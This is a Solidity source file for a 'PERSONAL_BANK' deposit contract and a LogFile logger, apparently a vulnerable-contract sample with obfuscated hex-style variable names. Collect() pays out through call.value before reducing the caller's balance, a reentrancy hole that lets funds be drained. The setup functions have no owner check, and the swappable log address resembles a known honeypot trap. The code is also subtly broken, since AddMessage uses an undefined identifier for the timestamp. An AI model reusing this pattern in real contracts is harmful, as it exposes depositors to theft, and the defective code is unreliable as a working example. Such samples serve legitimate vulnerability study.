// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public _0x989193;

    uint public MinSum = 1 ether;

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool _0xf59393;

    function SetMinSum(uint _0xed2f8f)
    public
    {
        if(_0xf59393)revert();
        MinSum = _0xed2f8f;
    }

    function SetLogFile(address _0xc92a96)
    public
    {
        if(_0xf59393)revert();
        Log = LogFile(_0xc92a96);
    }

    function Initialized()
    public
    {
        _0xf59393 = true;
    }

    function Deposit()
    public
    payable
    {
        _0x989193[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,"Put");
    }

    function Collect(uint _0x3a4667)
    public
    payable
    {
        if(_0x989193[msg.sender]>=MinSum && _0x989193[msg.sender]>=_0x3a4667)
        {
            if(msg.sender.call.value(_0x3a4667)())
            {
                _0x989193[msg.sender]-=_0x3a4667;
                Log.AddMessage(msg.sender,_0x3a4667,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        Deposit();
    }

}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x33b3de,uint _0xed2f8f,string _0x9c88f8)
    public
    {
        LastMsg.Sender = _0x33b3de;
        LastMsg.Time = _0x5ad4cc;
        LastMsg.Val = _0xed2f8f;
        LastMsg.Data = _0x9c88f8;
        History.push(LastMsg);
    }
}